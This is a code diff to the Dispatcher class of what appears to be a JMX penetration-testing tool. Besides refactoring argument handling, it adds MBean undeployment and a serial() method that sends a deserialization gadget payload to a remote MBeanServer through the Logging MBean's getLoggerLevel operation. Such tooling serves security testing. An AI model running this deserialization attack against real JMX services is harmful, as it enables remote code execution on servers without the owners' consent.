@@ -2,10 +2,14 @@ package de.qtc.beanshooter.operation;
 
 import java.util.Map;
 
+import javax.management.MBeanException;
 import javax.management.MBeanServerConnection;
 import javax.management.ObjectName;
+import javax.management.ReflectionException;
+import javax.management.RuntimeMBeanException;
 
-import de.qtc.beanshooter.cli.Option;
+import de.qtc.beanshooter.cli.ArgumentHandler;
+import de.qtc.beanshooter.exceptions.ExceptionHandler;
 import de.qtc.beanshooter.io.Logger;
 import de.qtc.beanshooter.plugin.PluginSystem;
 import de.qtc.beanshooter.utils.Utils;
@@ -32,9 +36,9 @@ public class Dispatcher {
         if( conn != null )
             return conn;
 
-        String host = Option.require(Option.TARGET_HOST);
-        int port = Option.require(Option.TARGET_PORT);
-        Map<String,Object> env = Option.getEnv();
+        String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
+        int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);
+        Map<String,Object> env = ArgumentHandler.getEnv();
 
         conn = PluginSystem.getMBeanServerConnection(host, port, env);
         return conn;
@@ -46,7 +50,7 @@ public class Dispatcher {
      *
      * @return MBeanServerConnection to the remote MBeanServer
      */
-    private MBeanServerClient getMBeanServerClient()
+    protected MBeanServerClient getMBeanServerClient()
     {
         if( client != null )
             return client;
@@ -67,26 +71,92 @@ public class Dispatcher {
         Logger.lineBreak();
         Logger.increaseIndent();
 
-        String mBeanClassName = Option.require(Option.DEPLOY_BEAN_CLASS);
-        ObjectName mBeanObjectName = Utils.getObjectName(Option.require(Option.DEPLOY_BEAN_NAME));
+        String mBeanClassName = ArgumentHandler.require(BeanshooterOption.DEPLOY_BEAN_CLASS);
+        ObjectName mBeanObjectName = Utils.getObjectName(ArgumentHandler.require(BeanshooterOption.DEPLOY_BEAN_NAME));
 
         MBeanServerClient mBeanServerClient = getMBeanServerClient();
-        mBeanServerClient.deployMBean(mBeanClassName, mBeanObjectName, true);
+        mBeanServerClient.deployMBean(mBeanClassName, mBeanObjectName, ArgumentHandler.require(BeanshooterOption.DEPLOY_JAR_FILE));
 
         Logger.decreaseIndent();
     }
 
+    /**
+     * Removes the specified MBean from the remote MBeanServer.
+     */
+    public void undeploy()
+    {
+        ObjectName mBeanObjectName = Utils.getObjectName(ArgumentHandler.require(BeanshooterOption.UNDEPLOY_BEAN_NAME));
+        
+        MBeanServerClient mBeanServerClient = getMBeanServerClient();
+        mBeanServerClient.unregisterMBean(mBeanObjectName);
+    };
 
+    public void enumerate()
+    {
+    };
+
+
+    /**
+     * The serial action performs an deserialization attack on the remote MBeanServer. It uses the
+     * getLoggerLevel function for this purpose, as it expects an arbitrary Object as argument.
+     */
+    public void serial()
+    {
+        MBeanServerClient mBeanServerClient = getMBeanServerClient();
+        Object payloadObject = ArgumentHandler.getInstance().getGadget();
+        ObjectName loggingMBean = Utils.getObjectName("java.util.logging:type=Logging");
+        
+        Logger.println("Attemting deserialization attack on JMX endpoint.");
+        Logger.lineBreak();
+        Logger.increaseIndent();
+
+        try {
+            mBeanServerClient.invoke(loggingMBean, "getLoggerLevel", payloadObject);
+
+        } catch ( MBeanException | ReflectionException  e) {
+            
+        	Throwable t = ExceptionHandler.getCause(e);
+        	
+        	if( t instanceof ClassNotFoundException)
+        		ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);
+                
+            else
+                Logger.eprintlnMixedYellow("Encountered unexpected", t.getClass().getName(), "after the payload object was sent.");
+
+	        ExceptionHandler.showStackTrace(e);
+
+        } catch (RuntimeMBeanException | SecurityException e) {
+        	
+        	Throwable t = ExceptionHandler.getCause(e);
+            Logger.eprintlnMixedYellow("Caught", t.getClass().getName(), "after the payload object was sent.");
+            
+            if( t instanceof IllegalArgumentException || t instanceof SecurityException )
+                Logger.eprintlnMixedBlue("Payload object probably", "worked anyway.");
+
+	        ExceptionHandler.showStackTrace(e);
+        
+        } catch( java.rmi.UnmarshalException e) {
+        	
+        	Throwable t = ExceptionHandler.getCause(e);
+        	
+        	if( t instanceof ClassNotFoundException)
+        		ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);
+
+            else
+                Logger.eprintlnMixedYellow("Encountered unexpected", t.getClass().getName(), "after the payload object was sent.");
+
+	        ExceptionHandler.showStackTrace(e);
+        }
+    };
+    
+    public void invoke() {};
 
     public void brute() {};
     public void downloadFile() {};
-    public void enumerate() {};
-    public void executeCommand() {};
-    public void serial() {};
     public void shell() {};
+    public void status() {};
+
     public void tomcat() {};
-    public void invokeTonkaBean() {};
-    public void undeployMBean() {};
     public void uploadFile() {};
 
 }
